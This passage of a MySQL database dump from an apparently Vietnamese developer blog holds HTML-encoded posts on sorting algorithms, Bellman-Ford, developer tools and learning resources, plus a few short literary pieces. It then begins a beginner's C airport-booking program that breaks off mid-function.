nhỏ hơn hoặc bằng gi&aacute; trị cần t&igrave;m, ta thực hiện t&igrave;m kiếm tuyến t&iacute;nh trong một đoạn mảng nhỏ hơn để t&igrave;m vị tr&iacute; ch&iacute;nh x&aacute;c của gi&aacute; trị cần t&igrave;m.</p>\r\n\r\n<p>5.&nbsp;<strong>T&igrave;m kiếm theo đệ quy (Recursive search)</strong>: Sử dụng phương ph&aacute;p gọi đệ quy để t&igrave;m kiếm. Thường được &aacute;p dụng v&agrave;o danh s&aacute;ch li&ecirc;n kết hoặc c&acirc;y để t&igrave;m kiếm một phần tử cụ thể.</p>', 'photo/14899399453.9.png', 'admin', 0, '2024-06-29 06:25:21');
INSERT INTO `contentmembers` (`id`, `title`, `url`, `content`, `image`, `author`, `view_count`, `reg_date`) VALUES
(105, 'Thuật toán hay, bạn đã biết - &#34;Bucket Sort&#34;', 'dev ơi mình đi đâu thế?', '<p>Bucket sort l&agrave; một kỹ thuật sắp xếp m&agrave; li&ecirc;n quan đến việc chia c&aacute;c phần tử th&agrave;nh c&aacute;c nh&oacute;m, hoặc &quot;th&ugrave;ng&quot;. C&aacute;c th&ugrave;ng n&agrave;y được tạo ra bằng c&aacute;ch ph&acirc;n phối đồng đều c&aacute;c phần tử. Khi c&aacute;c phần tử được chia th&agrave;nh c&aacute;c th&ugrave;ng, ch&uacute;ng c&oacute; thể được sắp xếp bằng bất kỳ thuật to&aacute;n sắp xếp n&agrave;o kh&aacute;c. Cuối c&ugrave;ng, c&aacute;c phần tử đ&atilde; được sắp xếp được tổng hợp lại theo thứ tự.</p>\r\n\r\n<p><strong>Thuật to&aacute;n Bucket Sort:</strong></p>\r\n\r\n<p>Tạo n th&ugrave;ng trống (hoặc danh s&aacute;ch) v&agrave; thực hiện c&aacute;c bước sau đ&acirc;y cho mỗi phần tử mảng arr[i].</p>\r\n\r\n<ol>\r\n	<li>\r\n	<p>Ch&egrave;n arr[i] v&agrave;o th&ugrave;ng [n*array[i]].</p>\r\n	</li>\r\n	<li>\r\n	<p>Sắp xếp c&aacute;c th&ugrave;ng ri&ecirc;ng lẻ bằng c&aacute;ch sử dụng thuật to&aacute;n sắp xếp ch&egrave;n.</p>\r\n	</li>\r\n	<li>\r\n	<p>Gh&eacute;p tất cả c&aacute;c th&ugrave;ng đ&atilde; được sắp xếp.</p>\r\n	</li>\r\n</ol>\r\n\r\n<p><strong>L&agrave;m thế n&agrave;o Bucket Sort hoạt động?</strong><br />\r\n<br />\r\nĐể &aacute;p dụng bucket sort v&agrave;o mảng đầu v&agrave;o [0.78, 0.17, 0.39, 0.26, 0.72, 0.94, 0.21, 0.12, 0.23, 0.68], ch&uacute;ng ta tu&acirc;n theo c&aacute;c bước sau đ&acirc;y:</p>\r\n\r\n<p>Bước 1: Tạo một mảng c&oacute; k&iacute;ch thước 10, trong đ&oacute; mỗi &ocirc; đại diện cho một th&ugrave;ng.</p>\r\n\r\n<p>Bước 2: Ch&egrave;n c&aacute;c phần tử v&agrave;o c&aacute;c th&ugrave;ng từ mảng đầu v&agrave;o dựa tr&ecirc;n phạm vi của ch&uacute;ng.</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>Lấy từng phần tử từ mảng đầu v&agrave;o.</p>\r\n	</li>\r\n	<li>\r\n	<p>Nh&acirc;n phần tử với k&iacute;ch thước của mảng th&ugrave;ng (10 trong trường hợp n&agrave;y). V&iacute; dụ, với phần tử 0.23, ch&uacute;ng ta c&oacute; 0.23 * 10 = 2.3.</p>\r\n	</li>\r\n	<li>\r\n	<p>Chuyển kết quả th&agrave;nh số nguy&ecirc;n, cho ch&uacute;ng ta chỉ số th&ugrave;ng. Trong trường hợp n&agrave;y, 2.3 được chuyển th&agrave;nh số nguy&ecirc;n 2.</p>\r\n	</li>\r\n	<li>\r\n	<p>Ch&egrave;n phần tử v&agrave;o th&ugrave;ng tương ứng với chỉ số được t&iacute;nh to&aacute;n.</p>\r\n	</li>\r\n	<li>\r\n	<p>Lặp lại c&aacute;c bước n&agrave;y cho tất cả c&aacute;c phần tử trong mảng đầu v&agrave;o.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>Bước 3: Sắp xếp c&aacute;c phần tử trong mỗi th&ugrave;ng. Trong v&iacute; dụ n&agrave;y, ch&uacute;ng ta sử dụng quicksort (hoặc bất kỳ thuật to&aacute;n sắp xếp ổn định n&agrave;o kh&aacute;c) để sắp xếp c&aacute;c phần tử trong mỗi th&ugrave;ng.</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>&Aacute;p dụng một thuật to&aacute;n sắp xếp ổn định (v&iacute; dụ: Bubble Sort, Merge Sort) để sắp xếp c&aacute;c phần tử trong mỗi th&ugrave;ng.</p>\r\n	</li>\r\n	<li>\r\n	<p>C&aacute;c phần tử trong mỗi th&ugrave;ng đ&atilde; được sắp xếp.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>Bước 4: Tổng hợp c&aacute;c phần tử từ mỗi th&ugrave;ng v&agrave; đặt ch&uacute;ng trở lại v&agrave;o mảng gốc.</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>Lặp qua từng th&ugrave;ng theo thứ tự.</p>\r\n	</li>\r\n	<li>\r\n	<p>Ch&egrave;n từng phần tử ri&ecirc;ng lẻ từ th&ugrave;ng v&agrave;o mảng gốc.</p>\r\n	</li>\r\n	<li>\r\n	<p>Một khi một phần tử được sao ch&eacute;p, n&oacute; sẽ được loại bỏ khỏi th&ugrave;ng.</p>\r\n	</li>\r\n	<li>\r\n	<p>Lặp lại quy tr&igrave;nh n&agrave;y cho tất cả c&aacute;c th&ugrave;ng cho đến khi tất cả c&aacute;c phần tử đ&atilde; được thu thập.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>Bước 5: Mảng gốc b&acirc;y giờ chứa c&aacute;c phần tử đ&atilde; được sắp xếp.</p>\r\n\r\n<p>Mảng cuối c&ugrave;ng đ&atilde; được sắp xếp bằng bucket sort cho đầu v&agrave;o đ&atilde; cho l&agrave; [0.12, 0.17, 0.21, 0.23, 0.26, 0.39, 0.68, 0.72, 0.78, 0.94].</p>', 'photo/5 (1).png', 'admin', 0, '2024-06-29 06:25:21'),
(106, 'Radix Sort - Sắp xếp dữ liệu theo cơ sở chữ số', 'dev ơi mình đi đâu thế?', '<p>&nbsp;</p>\r\n\r\n<p>Radix Sort l&agrave; một trong những thuật to&aacute;n sắp xếp hiệu quả được sử dụng để sắp xếp c&aacute;c phần tử trong một mảng hoặc danh s&aacute;ch. Thuật to&aacute;n n&agrave;y hoạt động dựa tr&ecirc;n việc sắp xếp c&aacute;c phần tử dựa tr&ecirc;n từng chữ số của ch&uacute;ng. Radix Sort thường được sử dụng cho c&aacute;c số nguy&ecirc;n kh&ocirc;ng dấu, nhưng cũng c&oacute; thể được &aacute;p dụng cho c&aacute;c loại dữ liệu kh&aacute;c như chuỗi k&yacute; tự.</p>\r\n\r\n<p><strong>Nguy&ecirc;n tắc hoạt động:</strong></p>\r\n\r\n<ol>\r\n	<li>\r\n	<p>Bắt đầu từ chữ số thấp nhất (c&oacute; thể l&agrave; h&agrave;ng đơn vị), Radix Sort sẽ sắp xếp c&aacute;c phần tử dựa tr&ecirc;n gi&aacute; trị của chữ số n&agrave;y.</p>\r\n	</li>\r\n	<li>\r\n	<p>Sau khi sắp xếp xong, c&aacute;c phần tử được nh&oacute;m th&agrave;nh c&aacute;c nh&oacute;m dựa tr&ecirc;n gi&aacute; trị của chữ số đ&oacute;.</p>\r\n	</li>\r\n	<li>\r\n	<p>Tiếp tục qu&aacute; tr&igrave;nh sắp xếp v&agrave; nh&oacute;m với c&aacute;c chữ số tiếp theo cho đến khi tất cả c&aacute;c chữ số đ&atilde; được sắp xếp.</p>\r\n	</li>\r\n</ol>\r\n\r\n<p><strong>V&iacute; dụ:&nbsp;</strong>Giả sử ch&uacute;ng ta c&oacute; một mảng gồm c&aacute;c số nguy&ecirc;n: [170, 45, 75, 90, 802, 24, 2, 66]</p>\r\n\r\n<ol>\r\n	<li>\r\n	<p>Sắp xếp c&aacute;c số dựa tr&ecirc;n h&agrave;ng đơn vị: [170, 90, 802, 2, 24, 45, 75, 66]</p>\r\n	</li>\r\n	<li>\r\n	<p>Sắp xếp lại dựa tr&ecirc;n h&agrave;ng chục: [802, 2, 24, 45, 66, 170, 75, 90]</p>\r\n	</li>\r\n	<li>\r\n	<p>Sắp xếp dựa tr&ecirc;n h&agrave;ng trăm (nếu c&oacute;): [2, 24, 45, 66, 75, 90, 170, 802]</p>\r\n	</li>\r\n</ol>\r\n\r\n<p><strong>Ưu điểm:</strong></p>\r\n\r\n<ol>\r\n	<li>\r\n	<p>Radix Sort l&agrave; một thuật to&aacute;n ổn định, nghĩa l&agrave; n&oacute; duy tr&igrave; thứ tự của c&aacute;c phần tử c&oacute; gi&aacute; trị bằng nhau.</p>\r\n	</li>\r\n	<li>\r\n	<p>Hiệu suất của Radix Sort kh&ocirc;ng bị ảnh hưởng bởi k&iacute;ch thước của dữ liệu đầu v&agrave;o.</p>\r\n	</li>\r\n	<li>\r\n	<p>Thuật to&aacute;n n&agrave;y l&agrave;m việc tốt với dữ liệu số nguy&ecirc;n c&oacute; k&iacute;ch thước cố định, kh&ocirc;ng quan trọng dữ liệu lớn như thế n&agrave;o.</p>\r\n	</li>\r\n</ol>\r\n\r\n<p><strong>Nhược điểm:</strong></p>\r\n\r\n<ol>\r\n	<li>\r\n	<p>Radix Sort chỉ &aacute;p dụng cho c&aacute;c số kh&ocirc;ng &acirc;m, v&agrave; cần phải c&oacute; một h&agrave;m chuyển đổi dữ liệu để thực hiện sắp xếp cho c&aacute;c dạng dữ liệu kh&aacute;c.</p>\r\n	</li>\r\n	<li>\r\n	<p>Nếu số lượng chữ số của c&aacute;c phần tử trong mảng l&agrave; kh&aacute; lớn, Radix Sort c&oacute; thể trở n&ecirc;n kh&ocirc;ng hiệu quả về mặt thời gian v&agrave; kh&ocirc;ng gian.</p>\r\n	</li>\r\n</ol>\r\n\r\n<div class=\"ddict_btn\" style=\"top: 33px; left: 311.6px;\"><img src=\"chrome-extension://bpggmmljdiliancllaapiggllnkbjocb/logo/48.png\" /></div>', 'photo/7.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(107, 'Chinh phục mọi hành trình với thuật toán Bellman-Ford!', 'dev ơi mình đi đâu thế?', '<p><strong>Giới Thiệu:</strong><br />\r\nThuật to&aacute;n Bellman-Ford l&agrave; một thuật to&aacute;n d&ugrave;ng để t&igrave;m đường đi ngắn nhất từ một đỉnh nguồn đến tất cả c&aacute;c đỉnh c&ograve;n lại trong một đồ thị c&oacute; hướng c&oacute; trọng số. Thuật to&aacute;n n&agrave;y c&oacute; thể xử l&yacute; cả đồ thị c&oacute; cạnh mang trọng số &acirc;m.</p>\r\n\r\n<p><strong>C&aacute;ch thức hoạt động:</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Bước 1:</strong>&nbsp;Khởi tạo gi&aacute; trị khoảng c&aacute;ch từ đỉnh nguồn đến tất cả c&aacute;c đỉnh c&ograve;n lại l&agrave; v&ocirc; c&ugrave;ng, trừ đỉnh nguồn c&oacute; gi&aacute; trị l&agrave; 0.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Bước 2:</strong>&nbsp;Lặp lại n lần (n l&agrave; số lượng đỉnh của đồ thị):</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>+ Duyệt qua tất cả c&aacute;c cạnh trong đồ thị:</p>\r\n\r\n<p>+ Với mỗi cạnh (u, v), t&iacute;nh to&aacute;n gi&aacute; trị khoảng c&aacute;ch mới từ<br />\r\nđỉnh nguồn đến đỉnh v th&ocirc;ng qua cạnh (u, v).</p>\r\n\r\n<p>+ Nếu gi&aacute; trị khoảng c&aacute;ch mới nhỏ hơn gi&aacute; trị hiện tại, cập<br />\r\nnhật gi&aacute; trị khoảng c&aacute;ch hiện tại.</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Bước 3:</strong>&nbsp;Kiểm tra xem c&oacute; chu tr&igrave;nh &acirc;m trong đồ thị hay kh&ocirc;ng. Nếu c&oacute; chu tr&igrave;nh &acirc;m, thuật to&aacute;n b&aacute;o lỗi v&igrave; kh&ocirc;ng tồn tại đường đi ngắn nhất.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>Độ phức tạp:</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Thời gian:</strong>&nbsp;O(n^3)</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Bộ nhớ:</strong>&nbsp;O(n)</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>Ưu điểm / Nhược điểm:</strong></p>\r\n\r\n<p>Mặc d&ugrave; chậm hơn thuật to&aacute;n Dijkstra, nhưng thuật to&aacute;n Bellman-Ford c&oacute; khả năng xử l&yacute; c&aacute;c đồ thị c&oacute; cạnh c&oacute; trọng số &acirc;m, điều n&agrave;y l&agrave;m cho n&oacute; linh hoạt hơn.</p>\r\n\r\n<p><strong>Ứng dụng:</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>T&igrave;m đường đi ngắn nhất trong mạng lưới giao th&ocirc;ng.</p>\r\n	</li>\r\n	<li>\r\n	<p>T&igrave;m kiếm tuyến đường tối ưu trong logistics.</p>\r\n	</li>\r\n	<li>\r\n	<p>Giải b&agrave;i to&aacute;n quy hoạch tuyến t&iacute;nh.</p>\r\n	</li>\r\n</ul>', 'photo/3-17-2014-5-51-21-PM.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(123, 'những công cụ các dev sẽ cần', 'devimnhiuth?', '<p>1.Socket.IO</p>\r\n\r\n<p>Socket.IO l&agrave; một thư viện được sử dụng rất nhiều trong việc triển khai c&aacute;c t&iacute;nh năng kinh điển v&iacute; dụ như quả chu&ocirc;ng th&ocirc;ng b&aacute;o(realtime notification)</p>\r\n\r\n<p>2.Dotfuscator</p>\r\n\r\n<p>nếu dự &aacute;n của bạn đang x&acirc;y dựng ứng dụng .NET, th&igrave; Dotfuscator l&agrave; một c&ocirc;ng cụ m&agrave; bạn n&ecirc;n xem x&eacute;t sử dụng từ sớm. N&oacute; sẽ gi&uacute;p ứng dụng của cậu kh&oacute; bị dịch ngược(reverse engineering) hơn.</p>\r\n\r\n<p>3.Prometheus v&agrave; Grafana</p>\r\n\r\n<p>Combo thần th&aacute;nh được c&aacute;c dự &aacute;n sử dụng trong việc gi&aacute;m s&aacute;t hệ thống(monitoring)</p>\r\n\r\n<p>4.Redis</p>\r\n\r\n<p>Redis hẳn l&agrave; một c&ocirc;ng cụ qu&aacute; phổ biến rồi. Thường được c&aacute;c dự &aacute;n sử dụng để caching. B&ecirc;n cạnh đ&oacute;, n&oacute; c&ograve;n c&oacute; thể được d&ugrave;ng như một message queue hoặc một database nếu muốn</p>\r\n\r\n<p>5.jenkins</p>\r\n\r\n<p>c&ocirc;ng cụ phổ biến được sử dụng để triển khai CI/CD trong c&aacute;c dự &aacute;n</p>\r\n\r\n<p>6.MinIO</p>\r\n\r\n<p>hệ thống lưu trữ m&atilde; nguồn mở, hiệu suất cao, c&oacute; thể d&ugrave;ng để lưu h&igrave;nh ảnh, video, c&aacute;c loại file kh&aacute;c nhau. C&aacute;c cậu c&oacute; thể th&ocirc;ng qua API hoặc SDK để thực hiện chức năng upload download file với MinIO</p>\r\n\r\n<p>7.Elasticsearch</p>\r\n\r\n<p>hệ thống lưu trữ, t&igrave;m kiếm, ph&acirc;n t&iacute;ch, thống k&ecirc; dữ liệu một c&aacute;ch nhanh ch&oacute;ng v&agrave; hiệu quả. T&iacute;ch hợp dễ d&agrave;ng th&ocirc;ng qua API</p>\r\n\r\n<p>8.ELK</p>\r\n\r\n<p>3 ch&agrave;ng l&iacute;nh ngự l&acirc;m gi&uacute;p qu&aacute; tr&igrave;nh thu thập, lưu trữ, xử l&yacute; v&agrave; ph&acirc;n t&iacute;ch log trở n&ecirc;n dễ d&agrave;ng v&agrave; hiệu quả hơn bao giờ hết</p>\r\n\r\n<p>9.Kafka, RabbitMQ</p>\r\n\r\n<p>hai lựa chọn h&agrave;ng đầu cho việc xử l&yacute; message queue v&agrave; event streaming</p>\r\n\r\n<p>10.Docker, Docker compose, K8S, Helm</p>\r\n\r\n<p>&quot;bộ tứ si&ecirc;u ph&agrave;m&quot; trong việc triển khai, quản l&yacute; v&agrave; mở rộng ứng dụng dựa tr&ecirc;n c&aacute;c container</p>\r\n\r\n<p>11.JMeter</p>\r\n\r\n<p>c&ocirc;ng cụ hiệu quả để thực hiện test hiệu năng của ứng dụng, hỗ trợ thực hiện c&aacute;c thể loại test kh&aacute;c nhau như Load Testing, Stress Testing, Volume Testing, Endurance Testing,etc</p>', 'photo/1489939936Dientap.png', 'admin', 0, '2024-06-29 06:25:21'),
(124, 'cập nhật thêm các công cụ cho bài viết trước', 'devimnhiuth?', '<p>12.gRPC&nbsp;</p>\r\n\r\n<p>một trong những c&ocirc;ng nghệ được nhiều dự &aacute;n sử dụng để tăng tốc độ request-response giữa c&aacute;c server với server trong hệ thống microservices chằng chịt</p>\r\n\r\n<p>13.Neo4j</p>\r\n\r\n<p>l&agrave; 1 trong những graph database m&atilde; nguồn mở phổ biến nhất, thường được sử dụng trong việc x&acirc;y dựng c&aacute;c ứng dụng mạng x&atilde; hội, hoặc hồi dịch COVID th&igrave; c&oacute; thể sử dụng l&agrave;m ứng dụng truy vết bệnh nh&acirc;n COVID,etc...</p>\r\n\r\n<p>14.Cassandra</p>\r\n\r\n<p>thường được sử dụng trong c&aacute;c hệ thống xử l&yacute; dữ liệu lớn, Điển h&igrave;nh như l&agrave; chat app. Discord c&uacute;ng từng sử dụng Cassandra, cho đến khi số lượng user ph&aacute;t triển qu&aacute; nhanh, lưu đến h&agrave;ng ngh&igrave;n tỉ message dẫn đến việc phải chuyển qua ScyllaDb</p>\r\n\r\n<p>15.Ansible</p>\r\n\r\n<p>anh em devOps thường xuy&ecirc;n sử dụng tool n&agrave;y để tự động h&oacute;a c&ocirc;ng việc infrastructure provisioning, configuration management, deploy app,...etc</p>\r\n\r\n<p>16.ArgoCD</p>\r\n\r\n<p>c&aacute;i t&ecirc;n n&oacute;i l&ecirc;n tất cả. c&ugrave;ng với Jenkins, ArgoCD l&agrave; một c&ocirc;ng cụ được nhiều dự &aacute;n sử dụng để x&acirc;y dựng m&ocirc; h&igrave;nh GitOps. Trong đ&oacute; d&ugrave;ng CI d&ugrave;ng jenkins v&agrave; CD d&ugrave;ng ArgoCD</p>\r\n\r\n<p>&nbsp;</p>', 'photo/385093776_720584666773614_13709271938043898_n.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(125, 'một số trang web hỗ trợ bạn với CSS', 'devimnhiuth?', '<p>1.Neumorphism.io</p>\r\n\r\n<p>2.uiverse</p>\r\n\r\n<p>3.https://animista.net/play/basic/slide</p>\r\n\r\n<p>4.https://10015.io/tools/css-clip-path-generator</p>', 'photo/14899399453.9.png', 'admin', 0, '2024-06-29 06:25:21'),
(126, 'viết để TH', 'facebook.com', '<p>khi con người ta mới quen nhau, đều c&oacute; th&oacute;i quen ph&ocirc; b&agrave;y hết những điểm tốt của m&igrave;nh, nhưng tiếp x&uacute;c l&acirc;u ng&agrave;y, c&aacute;c khuyết điểm sẽ dần bộc lộ. Đến một ng&agrave;y n&agrave;o đ&oacute;, bạn kh&ocirc;ng c&ograve;n phải mệt mỏi che giấu, m&agrave; đối phương cũng nh&igrave;n thấu hết con người bạn nhưng vẫn kh&ocirc;ng rời xa bạn. Đ&oacute; ch&iacute;nh l&agrave; t&igrave;nh y&ecirc;u.</p>', 'photo/1490893009computer-forensics3.jpg', 'admin', 1, '2024-08-20 06:54:48'),
(127, 'bách khoa toàn thư API', 'devimnhiuth?', '<p>1.Public APIs</p>\r\n\r\n<p>https://github.com/public-apis/public-apis</p>\r\n\r\n<p>kho API miễn ph&iacute; để thực h&agrave;nh lập tr&igrave;nh hoặc l&agrave;m sản phẩm, c&oacute; đủ thể loại API từ giải tr&iacute;, thiết kế, s&aacute;ch, đồ ăn, tr&ograve; chơi, truyện tranh, &acirc;m nhạc, tin tức, dữ liệu nguồn mở, lập tr&igrave;nh, to&aacute;n học, bảo mật, thời tiết,... v&agrave; nhiều loại kh&aacute;c.</p>\r\n\r\n<p>2.Devdocs.io</p>\r\n\r\n<p>https://devdocs.io</p>\r\n\r\n<p>kho t&agrave;i liệu lập tr&igrave;nh tổng hợp ho&agrave;n to&agrave;n miễn ph&iacute; v&agrave; c&oacute; thể sử dụng khi offline.C&ocirc;ng cụ n&agrave;y được đ&aacute;nh gi&aacute; rất cao bởi t&iacute;nh đa dạng v&agrave; hữu dụng của n&oacute;. kh&ocirc;ng chỉ chứa t&agrave;i liệu cho cả ng&ocirc;n ngữ lập tr&igrave;nh back-end v&agrave; front-end, cũng như c&aacute;c thư viện v&agrave; framework phổ biến.</p>\r\n\r\n<p>3.Over API</p>\r\n\r\n<p>https://overapi.com</p>\r\n\r\n<p>đ&acirc;y l&agrave; website tổng hợp c&aacute;c cheat sheet frameworks, dev tools cho c&aacute;c bạn tha hồ lựa chọn. c&oacute; rất nhiều ng&ocirc;n ngữ lập tr&igrave;nh phổ biến hiện n&agrave;y như javascript, nodejs, php, python,...</p>\r\n\r\n<p>&nbsp;</p>', 'photo/1_-sGG-7EvvTzOBSkhSqe8RQ-1.png', 'admin', 0, '2024-07-08 23:23:03'),
(128, 'Nguồn học lập trình', 'devimnhiuth?', '<p>1.Coursera: trang web về lĩnh vực c&ocirc;ng nghệ th&ocirc;ng tin được đ&ocirc;ng đảo sự quan t&acirc;m của người d&ugrave;ng tr&ecirc;n to&agrave;n thế giới</p>\r\n\r\n<p>2.Codecademy: kh&oacute;a học được hơn 24 triệu người tr&ecirc;n to&agrave;n thế giới ưa th&iacute;ch</p>\r\n\r\n<p>3.Code.org: Học code với c&aacute;c b&agrave;i giảng cơ bản</p>\r\n\r\n<p>4.Plural Sight: l&agrave; một kh&oacute;a học trực tuyến cung cấp c&aacute;c kh&oacute;a học miễn ph&iacute; v&agrave; trả ph&iacute; với c&aacute;c lộ tr&igrave;nh học về c&aacute;c m&atilde; lập tr&igrave;nh</p>\r\n\r\n<p>5.Dash: Học c&aacute;c kỹ thuật thiết kế web mới nhất v&agrave; chuy&ecirc;n nghiệp hơn.</p>', 'photo/14899399453.7.png', 'admin', 0, '2024-07-08 23:22:49'),
(129, 'Hoa trong rừng', 'facebooks', '<p>khi những tia nắng đầu ti&ecirc;n len qua đ&aacute;m m&acirc;y v&agrave; nhuộm khoảng trời rực rỡ m&agrave;u cam đỏ, cả thung lũng hoa cũng bừng tỉnh giấc đ&oacute;n &aacute;nh dương. M&oacute;n qu&agrave; của m&ugrave;a hạ, nếu kh&ocirc;ng phải l&agrave; một biển sương giăng th&igrave; sẽ l&agrave; b&igrave;nh minh đẹp say đắm.</p>', 'photo/tảixuống.jpg', 'sưu tầm', NULL, '2024-07-25 00:38:03'),
(130, 'Dino Corner', 'DinoCorner', '<p>Thời gian sẽ chữa l&agrave;nh gần như tất cả c&aacute;c vết thương. Vết thương chưa l&agrave;nh xin h&atilde;y chờ một l&aacute;t.</p>', 'photo/DinoCorner.jpg', 'Dino Corner', NULL, '2024-07-25 19:08:13'),
(131, 'nhungcuonsachhay', 'williamshakespeare', '<p>Nếu được h&ocirc;n em</p>\r\n\r\n<p>M&agrave; anh phải xuống địa ngục</p>\r\n\r\n<p>Th&igrave; anh vẫn sẽ l&agrave;m</p>\r\n\r\n<p>Như vậy anh c&oacute; thể khoe khoang với lũ quỷ</p>\r\n\r\n<p>Về thi&ecirc;n đ&agrave;ng</p>\r\n\r\n<p>D&ugrave; anh chưa một lần đặt ch&acirc;n đến đ&oacute;.</p>', 'photo/DinoCorner.jpg', 'nhà thơ William Shakespeare', NULL, '2024-07-25 19:12:10');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `files`
--

CREATE TABLE `files` (
  `id` int NOT NULL,
  `project_id` int NOT NULL,
  `name` varchar(255) NOT NULL,
  `content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `files`
--

INSERT INTO `files` (`id`, `project_id`, `name`, `content`, `created_at`, `updated_at`) VALUES
(11, 13, 'airport booking management system.c', '#include<stdio.h>\r\n#include<stdlib.h>\r\n#include<conio.h>\r\n#include<string.h>\r\n#include<Windows.h>\r\n\r\n\r\nstruct mufti_airline{\r\n	char passport[6];\r\n	char name[15];\r\n    char destination[15];\r\n	int seat_num;\r\n	char email[15];\r\n	struct mufti_airline *following;\r\n}\r\n*begin, *stream;\r\nstruct mufti_airline *dummy;\r\n\r\n\r\nvoid main()\r\n{\r\n	void reserve(int x), cancel(), display(), savefile();\r\n	int choice;\r\n	begin = stream = NULL;\r\n	int num = 1;\r\n	do\r\n	{\r\n\r\n		printf(\"\\n\\n\\t\\t ==============================================\");\r\n		printf(\"\\n\\t\\t        Airport Booking Management System      \");\r\n		printf(\"\\n\\t\\t ==============================================\");\r\n		printf(\"\\n\\n\\n\\t\\t Please enter your choice from below (1-4):\");\r\n		printf(\"\\n\\n\\t\\t 1. Make Reservation\");\r\n		printf(\"\\n\\n\\t\\t 2. Cancel\");\r\n		printf(\"\\n\\n\\t\\t 3. Show Record\");\r\n		printf(\"\\n\\n\\t\\t 4. Exit\");\r\n		printf(\"\\n\\n\\t\\t Enter your choice :\");\r\n\r\n		scanf(\"%d\", &choice); fflush(stdin);\r\n		system(\"cls\");\r\n		switch (choice)\r\n		{\r\n		case 1:\r\n			reserve(num);\r\n			num++;\r\n			break;\r\n		case 2:\r\n			cancel();\r\n			break;\r\n		case 3:\r\n			display();\r\n			break;\r\n		case 4:\r\n		{\r\n				  savefile();\r\n				  break;\r\n		}\r\n		default:\r\n			printf(\"\\n\\n\\t SORRY INVALID CHOICE!\");\r\n			printf(\"\\n\\n\\t PLEASE CHOOSE FROM 1-4\");\r\n			printf(\"\\n\\n\\t Do not forget to chose from 1-4\");\r\n		}\r\n		getch();\r\n	} while (choice != 4);\r\n}\r\n// ************************GOOD LUCK MUFTI*****************************\r\nvoid details()\r\n{\r\n	printf(\"\\n\\t Enter your passport number:\");\r\n	gets(stream->passport); fflush(stdin);\r\n	printf(\"\\n\\t Enter your  name:\");\r\n	gets(stream->name); fflush(stdin);\r\n	printf(\"\\n\\t Enter your email address:\");\r\n	gets(stream->email); fflush(stdin);\r\n    printf(\"\\n\\t Enter the Destination : \");\r\n    gets(stream->destination); fflush(stdin);\r\n}\r\n\r\n\r\n// ************************************GOOD LUCK MUFTI************************************\r\nvoid details();\r\n\r\nvoid reserve(int x)\r\n{\r\n	stream = begin;\r\n	if (begin == NULL)\r\n	{\r\n\r\n		begin = stream = (struct mufti_airline*)malloc(sizeof(struct mufti_airline));\r\n		details();\r\n		stream->following = NULL;\r\n		printf(\"\\n\\t Seat booking successful!\");\r\n		printf(\"\\n\\t your seat number is: Seat A-%d\", x);\r\n		stream->seat_num = x;\r\n		return;\r\n	}\r\n	else if (x > 15)\r\n	{\r\n		printf(\"\\n\\t\\t Seat Full.\");\r\n		return;\r\n	}\r\n	else\r\n	{\r\n\r\n		while (stream->following)\r\n			stream = stream->following;\r\n		stream->following = (struct mufti_airline *)malloc(sizeof(struct mufti_airline));\r\n		stream = stream->following;\r\n		details();\r\n		stream->following = NULL;\r\n		printf(\"\\n\\t Seat booking succesful!\");\r\n		printf(\"\\n\\t your seat number is: Seat A-%d\", x);\r\n		stream->seat_num = x;\r\n		return;\r\n	}\r\n}\r\n// ************************GOOD LUCK MUFTI********************************\r\n\r\n\r\nvoid savefile()\r\n{\r\n	FILE *fpointer = fopen(\"mufti records\", \"w\");\r\n	if (!fpointer)\r\n	{\r\n		printf(\"\\n Error in opening file!\");\r\n		return;\r\n		Sleep(800);\r\n	}\r\n	stream = begin;\r\n	while (stream)\r\n	{\r\n		fprintf(fpointer, \"%-6s\", stream->passport);\r\n		fprintf(fpointer, \"%-15s\", stream->name);\r\n		fprintf(fpointer, \"%-15s\", stream->email);\r\n        fprintf(fpointer, \"%-15s\", stream->destination);\r\n        fprintf(fpointer, \"\\n\");\r\n		stream = stream->following;\r\n	}\r\n	printf(\"\\n\\n\\t Details have been saved to a file (mufti records)\");\r\n	fclose(fpointer);\r\n}\r\n\r\n\r\nvoid display()\r\n{\r\n	stream = begin;\r\n	while (stream)\r\n	{\r\n		printf(\"\\n\\n Passport Number : %-6s\", stream->passport);\r\n		printf(\"\\n   name : %-15s\", stream->name);\r\n		printf(\"\\n   email address: %-15s\", stream->email);\r\n		printf(\"\\n   Seat number: A-%d\", stream->seat_num);\r\n        printf(\"\\n   Destination:%-15s\", stream->destination);\r\n		printf(\"\\n\\n++*=====================================================*++\");\r\n		stream = stream->following;\r\n	}\r\n\r\n}\r\n\r\n\r\nvoid cancel()\r\n{\r\n	stream = begin;\r\n	system(\"cls\");\r\n	char passport[6];\r\n	printf(\"\\n\\n Enter passort number to delete record?:\");\r\n	gets(passport); fflush(stdin);\r\n	if (strcmp(begin->passport, passport) == 0)\r\n	{\r\n		dummy = begin;\r\n		begin = begin->following;\r\n		free(dummy);\r\n		printf(\" booking has been deleted\");\r\n		Sleep(800);\r\n		return;\r\n\r\n	}\r\n\r\n	while (stream->following)\r\n	{\r\n		if (strcmp(stream->following->passport, passport) == 0)\r\n		{\r\n			dummy = stream->following;\r\n			stream->following = stream->following->following;\r\n			